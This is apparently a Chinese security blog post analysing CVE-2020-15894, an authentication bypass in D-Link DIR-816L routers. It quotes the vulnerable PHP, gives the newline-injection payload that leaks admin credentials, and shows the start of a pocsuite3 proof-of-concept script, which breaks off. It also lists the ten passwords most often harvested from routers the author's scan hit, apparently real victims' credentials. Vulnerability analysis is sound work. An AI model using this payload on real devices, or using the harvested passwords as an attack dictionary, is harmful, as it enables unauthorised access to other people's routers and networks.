<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" data-mode="dark">
  <!-- The Head -->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  >

  

  

  
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="CVE-2020-15894 D-Link DIR-816L信息泄露漏洞" />
<meta name="author" content="tomcat" />
<meta property="og:locale" content="en" />
<meta name="description" content="背景" />
<meta property="og:description" content="背景" />
<link rel="canonical" href="http://localhost:4000/posts/DIR816L/" />
<meta property="og:url" content="http://localhost:4000/posts/DIR816L/" />
<meta property="og:site_name" content="imjdl blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-02-28T12:13:00+08:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="CVE-2020-15894 D-Link DIR-816L信息泄露漏洞" />
<meta name="twitter:site" content="@Mortyjin" />
<meta name="twitter:creator" content="@MortyJin" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"tomcat","url":"https://twitter.com/MortyJin"},"dateModified":"2020-02-28T12:13:00+08:00","datePublished":"2020-02-28T12:13:00+08:00","description":"背景","headline":"CVE-2020-15894 D-Link DIR-816L信息泄露漏洞","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/DIR816L/"},"url":"http://localhost:4000/posts/DIR816L/"}</script>
<!-- End Jekyll SEO tag -->

  

  <title>CVE-2020-15894 D-Link DIR-816L信息泄露漏洞 | imjdl blog
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="imjdl blog">
<meta name="application-name" content="imjdl blog">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">
  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.2/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.21.3/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle">
      
        
        <img src="/assets/img/favicons/log.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'">
      
    </a>

    <h1 class="site-title">
      <a href="/">imjdl blog</a>
    </h1>
    <p class="site-subtitle fst-italic mb-0">Perpetual student, continual incremental improvement.</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/categories/" class="nav-link">
            <i class="fa-fw fas fa-stream"></i>
            

            <span>CATEGORIES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/tags/" class="nav-link">
            <i class="fa-fw fas fa-tags"></i>
            

            <span>TAGS</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>ARCHIVES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/about/" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i>
            

            <span>ABOUT</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    

    
      

      
        <a
          href="https://github.com/imjdl"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github"></i>
        </a>
      
    
      

      
        <a
          href="https://twitter.com/Mortyjin"
          aria-label="twitter"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fa-brands fa-x-twitter"></i>
        </a>
      
    
      

      
        <a
          href="javascript:location.href = 'mailto:' + ['imelloit','gmail.com'].join('@')"
          aria-label="email"
          

          

          

          
        >
          <i class="fas fa-envelope"></i>
        </a>
      
    
      

      
        <a
          href="/feed.xml"
          aria-label="rss"
          

          

          

          
        >
          <i class="fas fa-rss"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">
                Home
              </a>
            </span>

          
        
          
        
          
            
              <span>CVE-2020-15894 D-Link DIR-816L信息泄露漏洞</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  <!-- CDN URL -->
  

  <!-- Add image path -->
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  

  
  

  

  
  

  




<!-- return -->




<article class="px-1">
  <header>
    <h1 data-toc-skip>CVE-2020-15894 D-Link DIR-816L信息泄露漏洞</h1>

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1582863180"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Feb 28, 2020
</time>

      </span>

      <!-- lastmod date -->
      

      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              
                <a href="https://twitter.com/MortyJin">tomcat</a>
                
              
            
          </em>
        </span>

        <!-- read time -->
        <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="1196 words"
>
  <em>6 min</em> read</span>

      </div>
      <!-- .d-flex -->
    </div>
    <!-- .post-meta -->
  </header>

  <div class="content">
    <h2 id="背景"><span class="me-2">背景</span><a href="#背景" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>今天发现了 CVE-2020-15894 D-Link DIR-816L信息泄露漏洞。</p>

<div class="table-wrapper"><table>
  <thead>
    <tr>
      <th>项</th>
      <th>描述</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong>CVE编号</strong></td>
      <td>CVE-2020-15894</td>
    </tr>
    <tr>
      <td><strong>漏洞等级</strong></td>
      <td><strong>高危</strong></td>
    </tr>
    <tr>
      <td><strong>CNNVD编号</strong></td>
      <td>CNNVD-202007-1376</td>
    </tr>
    <tr>
      <td><strong>影响厂商</strong></td>
      <td>dlink友讯科技股份有限公司</td>
    </tr>
    <tr>
      <td><strong>影响固件</strong></td>
      <td>dir-816l_firmware</td>
    </tr>
    <tr>
      <td><strong>检索语法</strong></td>
      <td>“dlink友讯科技股份有限公司.dir-816l_firmware”</td>
    </tr>
    <tr>
      <td><strong>指纹</strong></td>
      <td>“target=”_blank”&gt;DIR-816L”</td>
    </tr>
    <tr>
      <td><strong>危害</strong></td>
      <td>泄漏各种配置信息，包含设备密码。</td>
    </tr>
  </tbody>
</table></div>

<h2 id="漏洞详情"><span class="me-2">漏洞详情</span><a href="#漏洞详情" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>NVD对漏洞的描述：</p>

<blockquote>

  <p>An issue was discovered on D-Link DIR-816L devices 2.x before 1.10b04Beta02. There exists an exposed administration function in getcfg.php, which can be used to call various services. It can be utilized by an attacker to retrieve various sensitive information, such as admin login credentials, by setting the value of _POST_SERVICES in the query string to DEVICE.ACCOUNT.</p>

</blockquote>

<p>问题出在getcfg.php中。(DIR-8XX系列中网上公布的有现有的Pyaload，此次和以前不一样的是请求方法为GET，参数为<code class="language-plaintext highlighter-rouge">_POST_SERVICE</code>)</p>

<p>固件下载：http://legacyfiles.us.dlink.com/</p>

<p>使用fat模拟固件运行环境，如图。</p>

<p><a href="/assets/img/DIR-816L/image-20200728193539978.png" class="popup img-link  shimmer"><img src="/assets/img/DIR-816L/image-20200728193539978.png" alt="image-20200728193539978" loading="lazy"></a></p>

<p>使用nb进行转发，使得外部能够访问。</p>

<p><a href="/assets/img/DIR-816L/image-20200729001327785.png" class="popup img-link  shimmer"><img src="/assets/img/DIR-816L/image-20200729001327785.png" alt="image-20200729001327785" loading="lazy"></a></p>

<p>ssh登录，得到<code class="language-plaintext highlighter-rouge">getcfg.php</code>，漏洞利用点在</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="nv">$file</span> <span class="o">=</span> <span class="s2">"/htdocs/webinc/getcfg/"</span><span class="mf">.</span><span class="nv">$GETCFG</span><span class="n">\_SVC</span><span class="mf">.</span><span class="s2">".xml.php"</span><span class="p">;</span>
<span class="o">/</span><span class="err">\</span><span class="o">*</span> <span class="n">GETCFG\_SVC</span> <span class="n">will</span> <span class="n">be</span> <span class="n">passed</span> <span class="n">to</span> <span class="n">the</span> <span class="n">child</span> <span class="n">process</span><span class="mf">.</span> <span class="err">\</span><span class="o">*/</span>
<span class="k">if</span> <span class="p">(</span><span class="nf">isfile</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span><span class="o">==</span><span class="s2">"1"</span><span class="p">)</span> <span class="nf">dophp</span><span class="p">(</span><span class="s2">"load"</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div>

<p>到达此步需要绕过<code class="language-plaintext highlighter-rouge">is_power_user</code>函数。固件处理请求的函数均在<code class="language-plaintext highlighter-rouge">cgibin</code>中。</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre></td><td class="rouge-code"><pre><span class="k">function</span> <span class="n">is_power_user</span><span class="p">()</span>
<span class="p">{</span>
	<span class="k">if</span><span class="p">(</span><span class="nv">$_GLOBALS</span><span class="p">[</span><span class="s2">"AUTHORIZED_GROUP"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">""</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span><span class="p">(</span><span class="nv">$_GLOBALS</span><span class="p">[</span><span class="s2">"AUTHORIZED_GROUP"</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">if</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"CACHE"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"true"</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">echo</span> <span class="nf">dump</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s2">"/runtime/session/"</span><span class="mf">.</span><span class="nv">$SESSION_UID</span><span class="mf">.</span><span class="s2">"/postxml"</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">else</span>
<span class="p">{</span>
	<span class="k">if</span><span class="p">(</span><span class="nf">is_power_user</span><span class="p">()</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="cm">/* cut_count() will return 0 when no or only one token. */</span>
		<span class="nv">$SERVICE_COUNT</span> <span class="o">=</span> <span class="nf">cut_count</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"SERVICES"</span><span class="p">],</span> <span class="s2">","</span><span class="p">);</span>
		<span class="nf">TRACE_debug</span><span class="p">(</span><span class="s2">"GETCFG: got "</span><span class="mf">.</span><span class="nv">$SERVICE_COUNT</span><span class="mf">.</span><span class="s2">" service(s): "</span><span class="mf">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"SERVICES"</span><span class="p">]);</span>
		<span class="nv">$SERVICE_INDEX</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="k">while</span> <span class="p">(</span><span class="nv">$SERVICE_INDEX</span> <span class="o">&lt;</span> <span class="nv">$SERVICE_COUNT</span><span class="p">)</span>
		<span class="p">{</span>
			<span class="nv">$GETCFG_SVC</span> <span class="o">=</span> <span class="nf">cut</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"SERVICES"</span><span class="p">],</span> <span class="nv">$SERVICE_INDEX</span><span class="p">,</span> <span class="s2">","</span><span class="p">);</span>
			<span class="nf">TRACE_debug</span><span class="p">(</span><span class="s2">"GETCFG: serivce["</span><span class="mf">.</span><span class="nv">$SERVICE_INDEX</span><span class="mf">.</span><span class="s2">"] = "</span><span class="mf">.</span><span class="nv">$GETCFG_SVC</span><span class="p">);</span>
			<span class="k">if</span> <span class="p">(</span><span class="nv">$GETCFG_SVC</span><span class="o">!=</span><span class="s2">""</span><span class="p">)</span>
			<span class="p">{</span>
				<span class="nv">$file</span> <span class="o">=</span> <span class="s2">"/htdocs/webinc/getcfg/"</span><span class="mf">.</span><span class="nv">$GETCFG_SVC</span><span class="mf">.</span><span class="s2">".xml.php"</span><span class="p">;</span>
				<span class="cm">/* GETCFG_SVC will be passed to the child process. */</span>
				<span class="k">if</span> <span class="p">(</span><span class="nf">isfile</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span><span class="o">==</span><span class="s2">"1"</span><span class="p">)</span> <span class="nf">dophp</span><span class="p">(</span><span class="s2">"load"</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
			<span class="p">}</span>
			<span class="nv">$SERVICE_INDEX</span><span class="o">++</span><span class="p">;</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="k">else</span>
	<span class="p">{</span>
		<span class="cm">/* not a power user, return error message */</span>
		<span class="k">echo</span> <span class="s2">"</span><span class="se">\t</span><span class="s2">&lt;result&gt;FAILED&lt;/result&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
		<span class="k">echo</span> <span class="s2">"</span><span class="se">\t</span><span class="s2">&lt;message&gt;Not authorized&lt;/message&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>反编译<code class="language-plaintext highlighter-rouge">cgibin</code>找到<code class="language-plaintext highlighter-rouge">main</code>函数，<code class="language-plaintext highlighter-rouge">phpcgi</code>处理相应的php的请求。<a href="/assets/img/DIR-816L/image-20200729154433561.png" class="popup img-link  shimmer"><img src="/assets/img/DIR-816L/image-20200729154433561.png" alt="image-20200729154433561" loading="lazy"></a></p>

<p>phpcgi_main: 判断请求方法，Payload为GET则调用FUN_00405798。</p>

<p><a href="/assets/img/DIR-816L/image-20200729154916981.png" class="popup img-link  shimmer"><img src="/assets/img/DIR-816L/image-20200729154916981.png" alt="image-20200729154916981" loading="lazy"></a></p>

<p><a href="/assets/img/DIR-816L/image-20200729155114528.png" class="popup img-link  shimmer"><img src="/assets/img/DIR-816L/image-20200729155114528.png" alt="image-20200729155114528" loading="lazy"></a></p>

<p>可以看到<code class="language-plaintext highlighter-rouge">FUN_00405798</code>将数据处理，以<code class="language-plaintext highlighter-rouge">0x3d</code>(=号)形成键值对参数，每个键前加上<code class="language-plaintext highlighter-rouge">_GET_</code>前缀。各个键值对之间以<code class="language-plaintext highlighter-rouge">10</code>(ascii码 <code class="language-plaintext highlighter-rouge">\n</code>)分割。
payload在经过处理后变成了
<code class="language-plaintext highlighter-rouge">_GET_a=\n_POST_SERVICES=DEVICE.ACCOUNT\nAUTHORIZED_GROUP=1</code>。最终以<code class="language-plaintext highlighter-rouge">\n</code>进行分割。导致<code class="language-plaintext highlighter-rouge">_POST_SERVICES=DEVICE.ACCOUNT</code>和<code class="language-plaintext highlighter-rouge">AUTHORIZED_GROUP=1</code>被分离出来。造成认证绕过。这也是此次GET请求中直接使用<code class="language-plaintext highlighter-rouge">_POST_SERVICES</code>而不是<code class="language-plaintext highlighter-rouge">SERVICES</code>的原因。</p>

<h2 id="命中结果分析"><span class="me-2">命中结果分析</span><a href="#命中结果分析" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>收集了此次命中目标使用的密码。组成了一个字典。使用频率前十如下表：</p>

<div class="table-wrapper"><table>
  <thead>
    <tr>
      <th>次数</th>
      <th>密码</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>206</td>
      <td>28001277</td>
    </tr>
    <tr>
      <td>36</td>
      <td>admin</td>
    </tr>
    <tr>
      <td>25</td>
      <td>qu4dk3y</td>
    </tr>
    <tr>
      <td>25</td>
      <td>boila1!</td>
    </tr>
    <tr>
      <td>22</td>
      <td>bonev47</td>
    </tr>
    <tr>
      <td>21</td>
      <td>r9112014</td>
    </tr>
    <tr>
      <td>21</td>
      <td>4163915581</td>
    </tr>
    <tr>
      <td>19</td>
      <td>oidtbmav1</td>
    </tr>
    <tr>
      <td>19</td>
      <td>JZax]Cd9”09qo</td>
    </tr>
    <tr>
      <td>19</td>
      <td>isiap1</td>
    </tr>
  </tbody>
</table></div>

<hr />

<h2 id="验证代码"><span class="me-2">验证代码</span><a href="#验证代码" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python
# -*- coding: utf-8 -*-
# Time : 2020/7/28 下午6:31
# Author : Morty Jin
# File : info_leak.py
# Email : imelloit@gmail.com
# copyright: (c) 2020 by Morty Jin.
# license: Apache2, see LICENSE for more details.
# description: Life is Fantastic.
</span>
<span class="kn">import</span> <span class="n">json</span>
<span class="kn">from</span> <span class="n">urllib.parse</span> <span class="kn">import</span> <span class="n">urlparse</span>
<span class="kn">from</span> <span class="n">lxml</span> <span class="kn">import</span> <span class="n">etree</span>

<span class="kn">from</span> <span class="n">pocsuite3.api</span> <span class="kn">import</span> <span class="n">Output</span>
<span class="kn">from</span> <span class="n">pocsuite3.api</span> <span class="kn">import</span> <span class="n">POCBase</span>
<span class="kn">from</span> <span class="n">pocsuite3.api</span> <span class="kn">import</span> <span class="n">register_poc</span>
<span class="kn">import</span> <span class="n">requests</span> <span class="k">as</span> <span class="n">req</span>


<span class="k">class</span> <span class="nc">TestPOC</span><span class="p">(</span><span class="n">POCBase</span><span class="p">):</span>
  <span class="n">vulID</span> <span class="o">=</span> <span class="sh">''</span>
  <span class="n">version</span> <span class="o">=</span> <span class="sh">''</span>
  <span class="n">author</span> <span class="o">=</span> <span class="p">[</span><span class="sh">""</span><span class="p">]</span>
  <span class="n">vulDate</span> <span class="o">=</span> <span class="sh">''</span>
  <span class="n">createDate</span> <span class="o">=</span> <span class="sh">''</span>
  <span class="n">updateDate</span> <span class="o">=</span> <span class="sh">''</span>
  <span class="n">references</span> <span class="o">=</span> <span class="p">[</span><span class="sh">""</span><span class="p">]</span>
  <span class="n">name</span> <span class="o">=</span> <span class="sh">""</span>
  <span class="n">appPowerLink</span> <span class="o">=</span> <span class="sh">''</span>
  <span class="n">appName</span> <span class="o">=</span> <span class="sh">''</span>
  <span class="n">appVersion</span> <span class="o">=</span> <span class="sh">''</span>
  <span class="n">vulType</span> <span class="o">=</span> <span class="sh">''</span>
  <span class="n">desc</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
    </span><span class="sh">'''</span>
  <span class="n">samples</span> <span class="o">=</span> <span class="p">[</span>
  <span class="p">]</span>
  <span class="n">install_requires</span> <span class="o">=</span> <span class="p">[</span><span class="sh">''</span><span class="p">]</span>
  <span class="n">search_keyword</span> <span class="o">=</span> <span class="sh">''</span>

  <span class="k">def</span> <span class="nf">_attack</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
    <span class="n">result</span> <span class="o">=</span> <span class="p">{}</span>
    <span class="c1">#Write your code here
</span>    <span class="k">return</span> <span class="n">self</span><span class="p">.</span><span class="nf">parse_output</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>

  <span class="k">def</span> <span class="nf">_verify</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
    <span class="n">result</span> <span class="o">=</span> <span class="p">{}</span>
    <span class="n">self</span><span class="p">.</span><span class="n">raw_url</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="n">url</span>
    <span class="n">host</span> <span class="o">=</span> <span class="nf">urlparse</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">url</span><span class="p">).</span><span class="n">hostname</span>
    <span class="n">port</span> <span class="o">=</span> <span class="nf">urlparse</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">url</span><span class="p">).</span><span class="n">port</span>
    <span class="n">scheme</span> <span class="o">=</span> <span class="nf">urlparse</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">url</span><span class="p">).</span><span class="n">scheme</span>
    <span class="k">if</span> <span class="n">port</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
      <span class="n">port</span> <span class="o">=</span> <span class="sh">"</span><span class="s">80</span><span class="sh">"</span>
    <span class="k">else</span><span class="p">:</span>
      <span class="n">port</span> <span class="o">=</span> <span class="nf">str</span><span class="p">(</span><span class="n">port</span><span class="p">)</span>
    <span class="k">if</span> <span class="sh">"</span><span class="s">https</span><span class="sh">"</span> <span class="o">==</span> <span class="n">scheme</span><span class="p">:</span>
      <span class="n">self</span><span class="p">.</span><span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">%s://%s</span><span class="sh">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">scheme</span><span class="p">,</span> <span class="n">host</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
      <span class="n">self</span><span class="p">.</span><span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">%s://%s:%s</span><span class="sh">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">scheme</span><span class="p">,</span> <span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
    <span class="c1"># Write your code here
</span>
    <span class="k">try</span><span class="p">:</span>
      <span class="n">res</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="nf">get_info</span><span class="p">()</span>
      <span class="k">if</span> <span class="n">res</span><span class="p">:</span>
        <span class="n">username</span><span class="p">,</span> <span class="n">password</span> <span class="o">=</span> <span class="n">res</span>
        <span class="n">result</span><span class="p">[</span><span class="sh">"</span><span class="s">url</span><span class="sh">"</span><span class="p">]</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="n">url</span>
        <span class="c1"># 单位信息，能够精准获取到的单位名称
</span>        <span class="n">result</span><span class="p">[</span><span class="sh">"</span><span class="s">unit_name</span><span class="sh">"</span><span class="p">]</span> <span class="o">=</span> <span class="sh">""</span>
